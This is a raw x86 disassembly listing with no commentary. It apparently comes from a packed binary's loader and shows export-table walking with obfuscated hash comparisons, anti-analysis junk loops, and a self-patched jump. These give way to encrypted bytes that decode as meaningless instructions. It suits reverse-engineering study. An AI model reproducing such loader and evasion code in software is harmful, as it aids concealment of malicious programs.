  405216:	mov    eax,DWORD PTR [eax+0x18]
  405219:	mov    DWORD PTR [ebp-0x24],eax
  40521c:	mov    eax,DWORD PTR [ebp-0x14]
  40521f:	mov    ecx,DWORD PTR [ebp+0x8]
  405222:	add    ecx,DWORD PTR [eax+0x20]
  405225:	mov    DWORD PTR [ebp-0x2c],ecx
  405228:	mov    eax,DWORD PTR [ebp-0x14]
  40522b:	mov    ecx,DWORD PTR [ebp+0x8]
  40522e:	add    ecx,DWORD PTR [eax+0x24]
  405231:	mov    DWORD PTR [ebp-0x34],ecx
  405234:	mov    eax,DWORD PTR [ebp-0x14]
  405237:	mov    ecx,DWORD PTR [ebp+0x8]
  40523a:	add    ecx,DWORD PTR [eax+0x1c]
  40523d:	mov    DWORD PTR [ebp-0x14],ecx
  405240:	jmp    0x40529b
  405245:	mov    eax,DWORD PTR [ebp-0x2c]
  405248:	mov    ecx,DWORD PTR [ebp+0x8]
  40524b:	add    ecx,DWORD PTR [eax+ebx*4]
  40524e:	mov    DWORD PTR [ebp-0x28],ecx
  405251:	mov    eax,DWORD PTR [ebp-0x4]
  405254:	mov    ecx,DWORD PTR [ebp-0x28]
  405257:	xor    eax,esi
  405259:	add    eax,edi
  40525b:	cmp    ecx,eax
  40525d:	je     0x40529b
  405263:	jmp    0x40528c
  405268:	mov    eax,DWORD PTR [ebp-0x4]
  40526b:	mov    ecx,DWORD PTR [ebp-0x8]
  40526e:	xor    eax,esi
  405270:	add    eax,edi
  405272:	cmp    ecx,eax
  405274:	mov    eax,DWORD PTR [ebp-0x4]
  405277:	je     0x4052d6
  40527d:	mov    ecx,DWORD PTR [ebp-0x30]
  405280:	xor    eax,esi
  405282:	add    eax,edi
  405284:	cmp    ecx,eax
  405286:	je     0x4052df
  40528c:	lea    eax,[ebp-0x8]
  40528f:	push   eax
  405290:	push   DWORD PTR [ebp-0x28]
  405293:	push   DWORD PTR [ebp+0xc]
  405296:	call   0x40eccc
  40529b:	mov    eax,DWORD PTR [ebp-0x4]
  40529e:	mov    ecx,DWORD PTR [ebp-0x8]
  4052a1:	xor    eax,esi
  4052a3:	add    eax,edi
  4052a5:	cmp    ecx,eax
  4052a7:	je     0x4052c2
  4052ad:	mov    eax,DWORD PTR [ebp-0x34]
  4052b0:	movzx  eax,WORD PTR [eax+ebx*2]
  4052b4:	mov    ecx,DWORD PTR [ebp-0x14]
  4052b7:	mov    eax,DWORD PTR [ecx+eax*4]
  4052ba:	mov    DWORD PTR [ebp-0x38],eax
  4052bd:	jmp    0x405268
  4052c2:	mov    eax,DWORD PTR [ebp-0xc]
  4052c5:	xor    eax,esi
  4052c7:	lea    ebx,[ebx+eax*1+0x3272e2]
  4052ce:	jmp    0x404fb8
  4052d3:	mov    eax,DWORD PTR [ebp-0x4]
  4052d6:	xor    eax,esi
  4052d8:	add    eax,edi
  4052da:	jmp    0x4053fc
  4052df:	mov    eax,DWORD PTR [ebp-0x38]
  4052e2:	add    eax,DWORD PTR [ebp+0x8]
  4052e5:	mov    DWORD PTR [ebp-0x18],eax
  4052e8:	mov    eax,DWORD PTR [ebp-0x1c]
  4052eb:	test   eax,eax
  4052ed:	je     0x405387
  4052f3:	mov    DWORD PTR [ebp-0x20],0x0
  4052fa:	push   0x3
  4052fc:	xor    edx,edx
  4052fe:	pop    edx
  4052ff:	add    edx,0x8
  405302:	push   edx
  405303:	pop    ecx
  405304:	push   0x6
  405306:	dec    ecx
  405307:	pop    ebx
  405308:	dec    ebx
  405309:	xchg   ebx,ecx
  40530b:	sub    ebx,ecx
  40530d:	xchg   ebx,ecx
  40530f:	dec    ecx
  405310:	mov    eax,DWORD PTR [ebp-0x1c]
  405313:	imul   eax,ecx
  405316:	sub    esp,eax
  405318:	mov    DWORD PTR [ebp-0x20],esp
  40531b:	mov    eax,DWORD PTR [ebp-0x4]
  40531e:	xor    eax,esi
  405320:	add    eax,edi
  405322:	jmp    0x405360
  405327:	mov    ecx,DWORD PTR [ebp-0xc]
  40532a:	mov    eax,DWORD PTR [ebp+0x8]
  40532d:	mov    edx,DWORD PTR [ebp+0x14]
  405330:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  405334:	xor    ecx,esi
  405336:	add    ecx,edi
  405338:	xor    edx,edx
  40533a:	div    ecx
  40533c:	mov    ecx,DWORD PTR [ebp-0x4]
  40533f:	xor    ecx,esi
  405341:	lea    eax,[ecx+eax*1+0x3272e2]
  405348:	mov    ecx,DWORD PTR [ebp+0x8]
  40534b:	mov    edx,DWORD PTR [ebp-0x20]
  40534e:	mov    DWORD PTR [edx+ecx*4],eax
  405351:	mov    eax,DWORD PTR [ebp-0xc]
  405354:	mov    ecx,DWORD PTR [ebp+0x8]
  405357:	xor    eax,esi
  405359:	lea    eax,[eax+ecx*1+0x3272e2]
  405360:	mov    DWORD PTR [ebp+0x8],eax
  405363:	mov    eax,DWORD PTR [ebp-0xc]
  405366:	mov    ecx,DWORD PTR [ebp+0x14]
  405369:	xor    eax,esi
  40536b:	add    eax,edi
  40536d:	imul   eax,DWORD PTR [ecx]
  405370:	mov    ecx,DWORD PTR [ebp-0x4]
  405373:	mov    edx,DWORD PTR [ebp+0x8]
  405376:	xor    ecx,esi
  405378:	lea    ecx,[ecx+edx*1+0x3272e2]
  40537f:	cmp    ecx,eax
  405381:	jne    0x405327
  405387:	mov    eax,DWORD PTR [ebp-0x4]
  40538a:	xor    eax,esi
  40538c:	add    eax,edi
  40538e:	mov    DWORD PTR [ebp-0x10],eax
  405391:	mov    ebx,0x65655
  405396:	add    ebx,0x3234
  40539c:	xchg   ebx,esi
  40539e:	xor    ebx,ebx
  4053a0:	push   esi
  4053a1:	mov    esi,ebx
  4053a3:	pop    ebx
  4053a4:	mov    edx,esi
  4053a6:	add    ebx,0x1002
  4053ac:	lea    eax,[ebp-0x18]
  4053af:	add    edx,eax
  4053b1:	add    edx,0x5
  4053b4:	push   edx
  4053b5:	inc    esi
  4053b6:	pop    ecx
  4053b7:	dec    ecx
  4053b8:	xchg   ecx,eax
  4053b9:	dec    eax
  4053ba:	xchg   ecx,eax
  4053bb:	dec    ecx
  4053bc:	xchg   ecx,edx
  4053be:	dec    edx
  4053bf:	push   edx
  4053c0:	mov    edx,ebx
  4053c2:	pop    ebx
  4053c3:	dec    ebx
  4053c4:	call   DWORD PTR [ebx]
  4053c6:	cmp    DWORD PTR [ebp+0x10],esi
  4053c9:	je     0x4053e8
  4053cf:	xchg   edx,eax
  4053d0:	push   0xb
  4053d2:	pop    ecx
  4053d3:	push   0x4
  4053d5:	pop    ebx
  4053d6:	inc    ebx
  4053d7:	xchg   ebx,ecx
  4053d9:	sub    ebx,ecx
  4053db:	xchg   ebx,ecx
  4053dd:	dec    ecx
  4053de:	dec    ecx
  4053df:	mov    eax,DWORD PTR [ebp-0x1c]
  4053e2:	imul   eax,ecx
  4053e5:	add    esp,eax
  4053e7:	xchg   edx,eax
  4053e8:	push   eax
  4053e9:	xor    ebx,ebx
  4053eb:	mov    edx,esp
  4053ed:	dec    edx
  4053ee:	inc    ebx
  4053ef:	add    ebx,DWORD PTR [edx+ebx*1]
  4053f2:	dec    ebx
  4053f3:	xor    edx,edx
  4053f5:	add    DWORD PTR [ebp-0x10],ebx
  4053f8:	pop    ebx
  4053f9:	mov    eax,DWORD PTR [ebp-0x10]
  4053fc:	pop    edi
  4053fd:	pop    esi
  4053fe:	pop    ebx
  4053ff:	leave  
  405400:	ret    0x10
  405403:	push   ebp
  405404:	mov    ebp,esp
  405406:	sub    esp,0x7c
  405409:	mov    DWORD PTR ds:0x42c018,0x17
  405413:	cmp    DWORD PTR ds:0x42c018,0x0
  40541a:	je     0x40544a
  405420:	cmp    DWORD PTR ds:0x42c018,0x20
  405427:	jne    0x405438
  40542d:	push   0x8a80
  405432:	call   DWORD PTR ds:0x42e8cb
  405438:	mov    eax,ds:0x42c018
  40543d:	dec    eax
  40543e:	mov    ds:0x42c018,eax
  405443:	jmp    0x405413
  405448:	adc    eax,ecx
  40544a:	push   esi
  40544b:	sub    esi,0x3b9
  405451:	push   edi
  405452:	mov    edi,DWORD PTR ds:0x41ce18
  405458:	mov    eax,ds:0x41cd89
  40545d:	sub    edi,eax
  40545f:	add    edi,DWORD PTR [edi+eax*1]
  405462:	mov    eax,ds:0x42e2b7
  405467:	and    DWORD PTR ds:0x42b018,0x0
  405471:	jmp    0x405483
  405476:	mov    ecx,DWORD PTR ds:0x42b018
  40547c:	inc    ecx
  40547d:	mov    DWORD PTR ds:0x42b018,ecx
  405483:	cmp    DWORD PTR ds:0x42b018,0x10
  40548a:	jae    0x4054d5
  405490:	cmp    DWORD PTR ds:0x42b018,0x5
  405497:	jne    0x4054b3
  40549d:	push   0x429020
  4054a2:	push   DWORD PTR [ebp-0x20]
  4054a5:	push   DWORD PTR [ebp-0x20]
  4054a8:	push   0x7ab5
  4054ad:	call   DWORD PTR ds:0x42e8cf
  4054b3:	cmp    DWORD PTR ds:0x42b018,0x4
  4054ba:	jne    0x4054cf
  4054c0:	xor    ecx,ecx
  4054c2:	or     ecx,DWORD PTR ds:0x42b018
  4054c8:	inc    ecx
  4054c9:	mov    DWORD PTR ds:0x42b018,ecx
  4054cf:	jmp    0x405476
  4054d4:	dec    edi
  4054d5:	mov    DWORD PTR [ebp-0x24],eax
  4054d8:	sbb    eax,DWORD PTR ds:0x42d000
  4054de:	mov    eax,ds:0x42e3c3
  4054e3:	mov    DWORD PTR [ebp-0x34],eax
  4054e6:	mov    DWORD PTR ds:0x42c014,0x14
  4054f0:	cmp    DWORD PTR ds:0x42c014,0x0
  4054f7:	je     0x405540
  4054fd:	cmp    DWORD PTR ds:0x42c014,0x2
  405504:	jne    0x405515
  40550a:	push   0x6dea
  40550f:	call   DWORD PTR ds:0x42e913
  405515:	cmp    DWORD PTR ds:0x42c014,0x3
  40551c:	jne    0x405530
  405522:	xor    eax,eax
  405524:	xor    eax,DWORD PTR ds:0x42c014
  40552a:	dec    eax
  40552b:	mov    ds:0x42c014,eax
  405530:	mov    eax,ds:0x42c014
  405535:	dec    eax
  405536:	mov    ds:0x42c014,eax
  40553b:	jmp    0x4054f0
  405540:	and    DWORD PTR [ebp-0x30],0x0
  405544:	mov    eax,ds:0x41cd9d
  405549:	mov    eax,DWORD PTR [eax]
  40554b:	adc    DWORD PTR ds:0x42c010,eax
  405551:	mov    DWORD PTR [ebp-0x2c],0xf89c8585
  405558:	add    edi,edi
  40555a:	mov    DWORD PTR [ebp-0x28],0xf89c8584
  405561:	mov    eax,DWORD PTR [ebp-0x10]
  405564:	mov    ecx,DWORD PTR [ebp-0x10]
  405567:	and    DWORD PTR ds:0x42c000,0x0
  405571:	jmp    0x405583
  405576:	mov    edi,DWORD PTR ds:0x42c000
  40557c:	inc    edi
  40557d:	mov    DWORD PTR ds:0x42c000,edi
  405583:	cmp    DWORD PTR ds:0x42c000,0x19
  40558a:	jae    0x4055bb
  405590:	cmp    DWORD PTR ds:0x42c000,0x1c
  405597:	jne    0x4055b0
  40559d:	push   DWORD PTR [ebp-0x20]
  4055a0:	push   0x5aa1
  4055a5:	push   0x4e93
  4055aa:	call   DWORD PTR ds:0x42e8d3
  4055b0:	jmp    0x405576
  4055b5:	and    esi,DWORD PTR ds:0x42b004
  4055bb:	sub    eax,ecx
  4055bd:	adc    DWORD PTR ds:0x42c014,ecx
  4055c3:	mov    DWORD PTR [ebp-0x10],eax
  4055c6:	xor    DWORD PTR [ebp-0x10],0xf89cb585
  4055cd:	sbb    esi,ecx
  4055cf:	mov    eax,DWORD PTR [ebp-0x18]
  4055d2:	mov    ecx,DWORD PTR [ebp-0x18]
  4055d5:	or     DWORD PTR ds:0x42a00c,ecx
  4055db:	sub    eax,ecx
  4055dd:	mov    DWORD PTR [ebp-0x18],eax
  4055e0:	or     DWORD PTR [ebp-0x18],0xf89f0585
  4055e7:	add    esi,DWORD PTR ds:0x42b018
  4055ed:	mov    eax,DWORD PTR [ebp-0xc]
  4055f0:	xor    edi,edi
  4055f2:	xor    edi,DWORD PTR ds:0x41cdd8
  4055f8:	mov    esi,DWORD PTR ds:0x41ce34
  4055fe:	sub    esi,edi
  405600:	imul   edi,DWORD PTR [edi+esi*1]
  405604:	mov    ecx,DWORD PTR [ebp-0xc]
  405607:	mov    DWORD PTR ds:0x429020,0x15
  405611:	cmp    DWORD PTR ds:0x429020,0x0
  405618:	je     0x40566c
  40561e:	cmp    DWORD PTR ds:0x429020,0xb
  405625:	jne    0x40563e
  40562b:	push   DWORD PTR [ebp-0x24]
  40562e:	push   0x42e000
  405633:	push   0x429018
  405638:	call   DWORD PTR ds:0x42e917
  40563e:	cmp    DWORD PTR ds:0x429020,0xc
  405645:	jne    0x40565a
  40564b:	xor    esi,esi
  40564d:	or     esi,DWORD PTR ds:0x429020
  405653:	dec    esi
  405654:	mov    DWORD PTR ds:0x429020,esi
  40565a:	mov    esi,DWORD PTR ds:0x429020
  405660:	dec    esi
  405661:	mov    DWORD PTR ds:0x429020,esi
  405667:	jmp    0x405611
  40566c:	sub    eax,ecx
  40566e:	mov    DWORD PTR [ebp-0xc],eax
  405671:	or     DWORD PTR [ebp-0xc],0xf89c85c5
  405678:	mov    eax,DWORD PTR [ebp-0x1c]
  40567b:	mov    ecx,DWORD PTR [ebp-0x1c]
  40567e:	sub    eax,ecx
  405680:	mov    DWORD PTR [ebp-0x1c],eax
  405683:	or     DWORD PTR [ebp-0x1c],0xf89c85a5
  40568a:	mov    eax,DWORD PTR [ebp-0x20]
  40568d:	mov    ecx,DWORD PTR [ebp-0x20]
  405690:	sub    eax,ecx
  405692:	mov    DWORD PTR [ebp-0x20],eax
  405695:	mov    eax,DWORD PTR [ebp-0x2c]
  405698:	mov    ecx,DWORD PTR [ebp-0x20]
  40569b:	mov    esi,0x751089b
  4056a0:	xor    eax,esi
  4056a2:	mov    edi,0x3272e2
  4056a7:	add    eax,edi
  4056a9:	or     eax,ecx
  4056ab:	mov    DWORD PTR [ebp-0x20],eax
  4056ae:	mov    eax,DWORD PTR [ebp-0x4]
  4056b1:	mov    ecx,DWORD PTR [ebp-0x4]
  4056b4:	sub    eax,ecx
  4056b6:	mov    DWORD PTR [ebp-0x4],eax
  4056b9:	or     DWORD PTR [ebp-0x4],0xf89c85b8
  4056c0:	mov    eax,DWORD PTR [ebp-0xc]
  4056c3:	xor    eax,esi
  4056c5:	add    eax,edi
  4056c7:	push   eax
  4056c8:	mov    eax,DWORD PTR [ebp-0x10]
  4056cb:	xor    eax,esi
  4056cd:	add    eax,edi
  4056cf:	push   eax
  4056d0:	mov    eax,DWORD PTR [ebp-0x4]
  4056d3:	xor    eax,esi
  4056d5:	add    eax,edi
  4056d7:	push   eax
  4056d8:	lea    eax,[ebp-0x7c]
  4056db:	push   eax
  4056dc:	push   DWORD PTR [ebp-0x2c]
  4056df:	push   DWORD PTR [ebp-0x28]
  4056e2:	call   0x40ebe9
  4056e7:	test   eax,eax
  4056e9:	je     0x405717
  4056ef:	lea    eax,[ebp-0x7c]
  4056f2:	push   eax
  4056f3:	mov    eax,DWORD PTR [ebp-0x28]
  4056f6:	xor    eax,esi
  4056f8:	add    eax,edi
  4056fa:	push   eax
  4056fb:	mov    eax,DWORD PTR [ebp-0x24]
  4056fe:	add    eax,0xaa
  405703:	push   eax
  405704:	mov    eax,DWORD PTR [ebp-0x24]
  405707:	mov    eax,DWORD PTR [eax+0x198]
  40570d:	push   DWORD PTR [eax]
  40570f:	call   0x40294c
  405714:	mov    DWORD PTR [ebp-0x14],eax
  405717:	lea    eax,[ebp+0x4]
  40571a:	mov    DWORD PTR [ebp-0x30],eax
  40571d:	mov    eax,DWORD PTR [ebp-0x14]
  405720:	test   eax,eax
  405722:	je     0x40578a
  405728:	lea    eax,[ebp-0x8]
  40572b:	mov    DWORD PTR [ebp-0x38],eax
  40572e:	mov    eax,DWORD PTR [ebp-0x34]
  405731:	mov    DWORD PTR [ebp-0x8],eax
  405734:	mov    eax,DWORD PTR [ebp-0x8]
  405737:	mov    ecx,DWORD PTR [ebp-0x14]
  40573a:	sub    eax,ecx
  40573c:	mov    DWORD PTR [ebp-0x8],eax
  40573f:	mov    ecx,DWORD PTR [ebp-0x4]
  405742:	xor    ecx,esi
  405744:	mov    eax,0xffcd8d1e
  405749:	sub    eax,ecx
  40574b:	add    DWORD PTR [ebp-0x8],eax
  40574e:	mov    eax,DWORD PTR [ebp-0x8]
  405751:	mov    ecx,DWORD PTR [ebp-0x14]
  405754:	mov    DWORD PTR [ecx+0x1],eax
  405757:	mov    eax,DWORD PTR [ebp-0x14]
  40575a:	push   DWORD PTR [ebp-0x24]
  40575d:	mov    BYTE PTR [eax],0xe9
  405760:	mov    eax,ds:0x42e133
  405765:	push   DWORD PTR [eax]
  405767:	push   DWORD PTR ds:0x42e38f
  40576d:	push   DWORD PTR ds:0x42e13b
  405773:	push   DWORD PTR ds:0x42e36f
  405779:	push   DWORD PTR ds:0x42e683
  40577f:	push   DWORD PTR [ebp-0x28]
  405782:	push   DWORD PTR [ebp-0x2c]
  405785:	mov    eax,DWORD PTR [ebp-0x14]
  405788:	call   eax
  40578a:	mov    eax,DWORD PTR [ebp-0x30]
  40578d:	mov    ecx,DWORD PTR ds:0x42e333
  405793:	add    DWORD PTR [eax],ecx
  405795:	pop    edi
  405796:	pop    esi
  405797:	leave  
  405798:	ret    
  405799:	push   ebp
  40579a:	mov    ebp,esp
  40579c:	sub    esp,0x18
  40579f:	mov    DWORD PTR ds:0x429014,0x19
  4057a9:	cmp    DWORD PTR ds:0x429014,0x0
  4057b0:	je     0x405814
  4057b6:	cmp    DWORD PTR ds:0x429014,0xd
  4057bd:	jne    0x4057d5
  4057c3:	push   DWORD PTR [ebp-0x20]
  4057c6:	push   DWORD PTR [ebp-0x24]
  4057c9:	push   DWORD PTR [ebp-0x24]
  4057cc:	push   DWORD PTR [ebp-0x28]
  4057cf:	call   DWORD PTR ds:0x42e8d7
  4057d5:	cmp    DWORD PTR ds:0x429014,0xe
  4057dc:	jne    0x4057f1
  4057e2:	xor    edx,edx
  4057e4:	xor    edx,DWORD PTR ds:0x429014
  4057ea:	dec    edx
  4057eb:	mov    DWORD PTR ds:0x429014,edx
  4057f1:	mov    edx,DWORD PTR ds:0x429014
  4057f7:	dec    edx
  4057f8:	mov    DWORD PTR ds:0x429014,edx
  4057fe:	jmp    0x4057a9
  405803:	mov    ecx,DWORD PTR ds:0x41cd6d
  405809:	mov    edx,DWORD PTR ds:0x41cd85
  40580f:	sub    edx,ecx
  405811:	and    ecx,DWORD PTR [ecx+edx*1]
  405814:	mov    DWORD PTR [ebp-0x10],0xf89f8585
  40581b:	sub    DWORD PTR ds:0x42d00c,0x7538
  405825:	lea    eax,[ebp+0x14]
  405828:	mov    DWORD PTR [ebp-0x4],eax
  40582b:	movzx  edx,WORD PTR ds:0x42b014
  405832:	sbb    DWORD PTR ds:0x42d01c,edx
  405838:	push   esi
  405839:	mov    esi,0xf89c8585
  40583e:	mov    edx,DWORD PTR ds:0x42d008
  405844:	and    DWORD PTR ds:0x42c010,edx
  40584a:	mov    DWORD PTR [ebp-0xc],esi
  40584d:	sbb    DWORD PTR ds:0x42900c,0x3284
  405857:	lea    eax,[ebp-0xc]
  40585a:	add    DWORD PTR ds:0x429024,0x6cdb
  405864:	mov    DWORD PTR [ebp-0x14],eax
  405867:	neg    eax
  405869:	mov    eax,DWORD PTR [ebp-0xc]
  40586c:	sbb    ecx,0x367b
  405872:	mov    edx,DWORD PTR [ebp-0x14]
  405875:	mov    ecx,0x751089b
  40587a:	sbb    DWORD PTR ds:0x42900c,0x429014
  405884:	xor    eax,ecx
  405886:	and    DWORD PTR ds:0x429014,0x429028
  405890:	add    eax,0x3272e2
  405895:	mov    DWORD PTR [edx],eax
  405897:	adc    edx,DWORD PTR ds:0x42d014
  40589d:	mov    eax,ds:0x42e12f
  4058a2:	adc    edx,DWORD PTR ds:0x42d008
  4058a8:	mov    edx,DWORD PTR [ebp-0x4]
  4058ab:	mov    eax,DWORD PTR [eax]
  4058ad:	xor    DWORD PTR ds:0x42b000,0x42a008
  4058b7:	add    eax,DWORD PTR [edx]
  4058b9:	push   edi
  4058ba:	and    edx,DWORD PTR ds:0x42a00c
  4058c0:	mov    DWORD PTR [ebp-0x8],eax
  4058c3:	movzx  eax,WORD PTR ds:0x42b000
  4058ca:	sub    DWORD PTR ds:0x42a010,eax
  4058d0:	mov    edi,DWORD PTR [ebp+0x8]
  4058d3:	xor    DWORD PTR ds:0x429018,0x6981
  4058dd:	jmp    0x407c2c
  4058e2:	mov    dh,0x31
  4058e4:	mov    ecx,0xb277bb1f
  4058e9:	jno    0x405908
  4058eb:	push   edi
  4058ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058ed:	xor    esi,edi
  4058ef:	dec    ecx
  4058f0:	scas   eax,DWORD PTR es:[edi]
  4058f1:	(bad)  
  4058f2:	xor    al,0x5f
  4058f4:	jl     0x405972
  4058f6:	dec    esi
  4058f7:	pop    edi
  4058f8:	jl     0x405976
  4058fa:	test   ebx,esi
  4058fc:	ins    BYTE PTR es:[edi],dx
  4058fd:	aas    
  4058fe:	and    ch,ah
  405900:	dec    ebp
  405901:	jge    0x405921
  405903:	sbb    al,0xf8
  405905:	push   eax
  405906:	hlt    
  405907:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  405909:	inc    ecx
  40590a:	imul   ebp,esi,0x999880af
  405910:	pop    ecx
  405911:	mov    esi,0x6c7e9b84
  405916:	sub    DWORD PTR [edi+0x7b754652],esp
  40591c:	neg    BYTE PTR [edx-0x47]
  40591f:	test   eax,0xb86c68cb
  405924:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405925:	and    al,0x87
  405927:	sar    DWORD PTR [esi],0x4a
  40592a:	in     eax,0x3d
  40592c:	mov    ecx,DWORD PTR [edi]
  40592e:	xchg   edx,eax
  40592f:	dec    edi
  405930:	scas   eax,DWORD PTR es:[edi]
  405931:	jecxz  0x4058bd
  405933:	fisttp QWORD PTR [edx-0x78]
  405936:	cmp    bl,BYTE PTR [edx-0x4f66f33a]
  40593c:	or     BYTE PTR ds:0x1e8f5d02,bl
  405942:	jg     0x405992
  405944:	jmp    0x25469f1f
  405949:	ins    DWORD PTR es:[edi],dx
  40594a:	imul   esi,DWORD PTR [ebx],0xffcc63c2
  405950:	inc    ebp
  405951:	cs xchg ecx,eax
  405953:	ret    0xaf33
  405956:	js     0x4058df
  405958:	adc    edi,ecx
  40595a:	repz sbb esi,edx
  40595d:	scas   eax,DWORD PTR es:[edi]
  40595e:	js     0x40590d
  405960:	push   ebx
  405961:	stos   BYTE PTR es:[edi],al
  405962:	xor    ebp,DWORD PTR ds:0xd0473348
  405968:	lds    edi,FWORD PTR [ebp+ebp*2-0x3da848ac]
  40596f:	xlat   BYTE PTR ds:[ebx]
  405970:	mov    esi,0xbc1c9dd7
  405975:	outs   dx,DWORD PTR ds:[esi]
  405976:	out    dx,al
  405977:	js     0x4059e8
  405979:	add    al,0xff
  40597b:	mov    bh,0xb9
  40597d:	cmp    BYTE PTR [edi+edi*2],bh
  405980:	add    DWORD PTR [esi-0x618b462b],eax
  405986:	rol    BYTE PTR [edi],0x64
  405989:	lahf   
  40598a:	(bad)  
  40598b:	xchg   ecx,eax
  40598c:	cwde   
  40598d:	sub    DWORD PTR [edx+0x1e41a21d],ebp
  405993:	push   ss
  405994:	movsx  ecx,bx
  405997:	pop    eax
  405998:	out    dx,al
  405999:	jl     0x4059ab
  40599b:	div    DWORD PTR [eax+0x611b8cdd]
  4059a1:	or     cl,al
  4059a3:	mov    ebx,0x55a6633b
  4059a8:	jecxz  0x4059dd
  4059aa:	out    dx,eax
  4059ab:	jbe    0x4059b2
  4059ad:	mov    bl,0xbc
  4059af:	push   esp
  4059b0:	push   cs
  4059b1:	lods   eax,DWORD PTR ds:[esi]
  4059b2:	idiv   DWORD PTR [eax+0x67]
  4059b5:	mov    ebp,0x8f2de327
  4059ba:	adc    edi,DWORD PTR [esi+eiz*4-0x43]
  4059be:	push   esi
  4059bf:	inc    ebp
  4059c0:	mov    edi,ecx
  4059c2:	or     al,0x17
  4059c4:	pop    ebp
  4059c5:	add    DWORD PTR ds:0xbeecc5b8,0x5
  4059cc:	pop    es
  4059cd:	repnz imul eax,DWORD PTR [esi+edi*2],0x53a8e31b
  4059d5:	fs fs jae 0x4059ba
  4059d9:	mov    ebp,0x924b3436
  4059de:	and    dl,0xe9
  4059e1:	(bad)  
  4059e2:	pop    esi
  4059e3:	scas   al,BYTE PTR es:[edi]
  4059e4:	jb     0x4059d0
  4059e6:	or     eax,0x45d73f18
  4059eb:	xor    ch,bh
  4059ed:	lds    esi,FWORD PTR [eax+0x7b3591c8]
  4059f3:	fwait
  4059f4:	add    dh,al
  4059f6:	xor    DWORD PTR [ebx],ebx
  4059f8:	in     al,dx
  4059f9:	sbb    DWORD PTR ds:0xd9ac69c9,ecx
  4059ff:	mov    al,dh
  405a01:	arpl   WORD PTR [ebp+0x3c2a2e68],cx
  405a07:	jnp    0x405997
  405a09:	mov    ds:0x27f4714,eax
  405a0e:	mov    BYTE PTR [edx-0x715e7281],al
  405a14:	add    edi,DWORD PTR [edi+0x7d]
  405a17:	adc    esi,DWORD PTR [edi+ecx*4-0x50]
  405a1b:	test   BYTE PTR [ecx-0x7d8856b0],al
  405a21:	adc    ch,dl
  405a23:	imul   esp,edi,0x41bbe482
  405a29:	loopne 0x405a2d
  405a2b:	fst    QWORD PTR [edx+0x41f7c7d2]
  405a31:	mov    eax,esp
  405a33:	loope  0x405a26
  405a35:	push   0xffffffdb
  405a37:	fisttp WORD PTR [edx-0x447d6496]
  405a3d:	shl    BYTE PTR [esi],cl
  405a3f:	fadd   QWORD PTR [esi+esi*8+0x5d4755f3]
  405a46:	(bad)  
  405a47:	adc    al,0x3c
  405a49:	mov    bh,0x91
  405a4b:	and    bh,BYTE PTR [ecx]
  405a4d:	jg     0x405ab5
  405a4f:	sub    eax,0x698dba7a
  405a54:	mov    dh,0xb
  405a56:	inc    ecx
  405a57:	clc    
  405a58:	data16 jnp 0x405a11
  405a5b:	out    dx,eax
  405a5c:	push   ss
  405a5d:	add    bl,BYTE PTR cs:[ebx+0x53576154]
  405a64:	loopne 0x405a6e
  405a66:	lock or al,bl
  405a69:	neg    DWORD PTR [edi+eax*8]
  405a6c:	add    eax,0x4f5f0f01
  405a71:	mov    dh,0xd6
  405a73:	mov    ch,0x93
  405a75:	out    0xab,eax
  405a77:	js     0x405aaf
  405a79:	or     cl,BYTE PTR [eax]
  405a7b:	cmp    edx,edx
  405a7d:	and    al,0xa7
  405a7f:	and    DWORD PTR [edx],ebp
  405a81:	bnd jbe 0x405a98
  405a84:	jecxz  0x405ad9
  405a86:	push   esi
  405a87:	das    
  405a88:	rcr    dh,cl
  405a8a:	push   eax
  405a8b:	jl     0x405a4f
  405a8d:	sub    edi,DWORD PTR [ebp-0x26b8bf3a]
  405a93:	mov    ecx,0xe9069d83
  405a98:	jae    0x405a87
  405a9a:	sub    BYTE PTR [ebp+ecx*8-0x36171c3f],0xc1
  405aa2:	iret   
  405aa3:	push   ebp
  405aa4:	loop   0x405a77
  405aa6:	out    dx,al
  405aa7:	clc    
  405aa8:	cmp    BYTE PTR [ebp+0x14],0x1c
  405aac:	test   eax,0xdb800a40
  405ab1:	shr    BYTE PTR [edi*8-0x7b9d07e9],0x2e
  405ab9:	les    edx,FWORD PTR [eax+0x1ee6f157]
  405abf:	(bad)  
  405ac0:	mov    eax,ds:0x58e9d381
  405ac5:	dec    esp
  405ac6:	fsincos 
  405ac8:	out    dx,eax
  405ac9:	sub    cl,BYTE PTR [edx]
  405acb:	jmp    0x8c1f85d4
  405ad0:	xchg   DWORD PTR [esi+0x743a6cc8],esi
  405ad6:	fst    QWORD PTR [edx]
  405ad8:	adc    al,0xea
  405ada:	test   al,0x22
  405adc:	fldcw  WORD PTR [edi*8-0x515e7b6a]
  405ae3:	add    BYTE PTR [edx],cl
  405ae5:	inc    eax
  405ae6:	repz leave 
  405ae8:	jg     0x405b53
  405aea:	mov    WORD PTR ds:0x6e9e4366,?
  405af0:	jecxz  0x405b51
  405af2:	push   eax
  405af3:	mov    BYTE PTR [esi-0x14213203],bh
  405af9:	jl     0x405b66
  405afb:	push   es
  405afc:	lds    edi,FWORD PTR [ebp-0x69]
  405aff:	gs mov ebp,0x25fc9ee4
  405b05:	fild   WORD PTR [ebp+0x3f2c4963]
  405b0b:	fist   DWORD PTR [edx]
  405b0d:	cld    
  405b0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b0f:	xchg   BYTE PTR [esi+0x74],bl
  405b12:	jecxz  0x405b31
  405b14:	stos   DWORD PTR es:[edi],eax
  405b15:	and    esi,DWORD PTR [eax-0x59]
  405b18:	push   ds
  405b19:	fnstenv [esi]
  405b1b:	sbb    edx,DWORD PTR [ecx-0x71b5d79]
  405b21:	je     0x405aa6
  405b23:	call   0x92f0c8ed
  405b28:	into   
  405b29:	popf   
  405b2a:	dec    ecx
  405b2b:	ja     0x405b7e
  405b2d:	cmp    al,0x1c
  405b2f:	sub    al,0xde
  405b31:	pop    ecx
  405b32:	outs   dx,DWORD PTR ds:[esi]
  405b33:	pop    ebp
  405b34:	rcl    DWORD PTR [ecx-0x147d59b9],1
  405b3a:	fisttp WORD PTR [ecx-0x51]
  405b3d:	arpl   WORD PTR [ecx-0x45dea436],si
  405b43:	xor    esi,DWORD PTR [ebx-0x49]
  405b46:	and    eax,0x90c739e5
  405b4b:	lds    esi,FWORD PTR [esp+ebp*1+0x1e]
  405b4f:	fsub   st(1),st
  405b51:	dec    ecx
